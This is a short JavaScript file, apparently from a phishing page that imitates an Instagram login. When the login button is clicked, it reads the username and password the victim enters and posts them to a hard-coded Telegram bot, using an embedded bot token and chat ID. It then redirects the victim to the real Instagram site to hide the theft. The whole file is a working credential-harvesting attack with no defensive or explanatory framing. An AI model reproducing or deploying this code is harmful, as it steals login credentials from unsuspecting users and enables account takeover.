let inputs = document.querySelectorAll('input');
let button = document.querySelector('.login-button');

const token = '7427049020:AAFbfOWwsgcjmqqITT7-mVrYMejxhPldLuk';
const chatId = '6716474557';

button.addEventListener('click', () => {
    const username = inputs[0].value.trim();
    const password = inputs[1].value.trim();

    const message = `Данные:\nUsername: ${username}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(res => console.log(res))
    .catch(err => console.error('Xatolik yuz berdi:', err));

    window.location.href = 'https://www.instagram.com/';
});
